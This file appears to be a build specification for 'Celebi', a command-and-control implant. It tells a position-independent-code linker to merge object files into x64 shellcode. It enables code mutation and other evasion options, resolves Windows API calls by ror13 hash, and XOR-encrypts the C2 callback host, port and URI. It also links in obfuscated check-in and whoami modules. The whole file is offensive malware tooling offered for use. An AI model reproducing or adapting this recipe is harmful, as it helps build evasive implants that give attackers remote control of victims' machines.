name "Celebi PIC Linker"
author "Callum Murphy-Hale (@ofasgard)"
reference "https://github.com/ofasgard/celebi"
license "GPL-2.0"

x64:
	# Load the COFF.
	load "bin/main.o"
	make coff
	
	# Merge in other objects.
	load "bin/vault.o"
	merge
	
	load "bin/message.o"
	merge
	
	load "bin/params.o"
	merge

	load "bin/pico.o"
	merge
	
	load "bin/util.o"
	merge
	
	export
	
	# Make the shellcode.
	make pic +optimize +gofirst +disco +mutate +regdance +blockparty
	
	# Merge in LibTCG.
	mergelib "lib/libtcg/libtcg.x64.zip"
	
	# Merge in LibWinHttp.
	mergelib "lib/LibWinHttp/libwinhttp.x64.zip"
	
	# Opt into dynamic function resolution using the resolve() function.
	dfr "resolve" "ror13" "KERNEL32, NTDLL"
	dfr "resolve_unloaded" "strings"
	
	# Generate a random XOR key and patch it in.
	generate $ENC_KEY 128
	patch "ENC_KEY" $ENC_KEY
	
	# Marshal and obfuscate string parameters from the C2.
	pack $RAW_PARAMS "zziiz" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %CALLBACK_URI
	
	push $RAW_PARAMS
	xor $ENC_KEY
	pop $ENC_PARAMS
	
	# Patch in obfuscated string parameters from the C2.
	patch "ENC_PARAMS" $ENC_PARAMS
	
	# Load and obfuscate built-in PICOs.
	load "bin/pico_checkin.o"
		make object +optimize
		export
		xor $ENC_KEY
		preplen
		link "pico_checkin"
		
	load "bin/pico_whoami.o"
		make object +optimize
		export
		xor $ENC_KEY
		preplen
		link "pico_whoami"

 	# Export the resulting PIC.
	export
